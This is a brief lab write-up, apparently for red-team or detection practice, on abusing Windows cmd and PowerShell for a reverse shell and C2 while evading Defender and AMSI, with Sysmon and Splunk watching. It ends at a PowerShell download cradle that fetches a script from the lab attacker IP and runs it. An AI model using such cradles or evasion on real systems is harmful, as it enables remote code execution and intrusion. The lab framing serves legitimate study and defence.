### T1059.003 - Command and Scripting Interpreter: Windows Command Shell / PowerShell

### Description
This lab demonstrates the abuse of native Windows scripting interpreters (`cmd.exe` and `PowerShell`) to establish an interactive reverse shell for post-exploitation and Command & Control (C2).  

The goal is to simulate real-world adversary behavior using **Living-off-the-Land (LOLBins)** techniques while bypassing common security controls such as Windows Defender and AMSI.

**MITRE ATT&CK Technique:** [T1059.003 - Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)

---

### Simulation Parameters

- **Attacker Host:** Kali Linux (`192.168.10.250`)
- **Target Host:** Windows 10 Workstation (`192.168.10.9`)
- **Domain Context:** ADPRO
- **Defensive Monitoring:** Sysmon + Splunk Enterprise Forwarder
- **Objective:** Establish C2 channel without using Metasploit Meterpreter (unlike previous TTPs)

---

### Execution Methods Tested

### Method 1: PowerShell Download Cradle (Basic)
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.10.250/shell.ps1')"
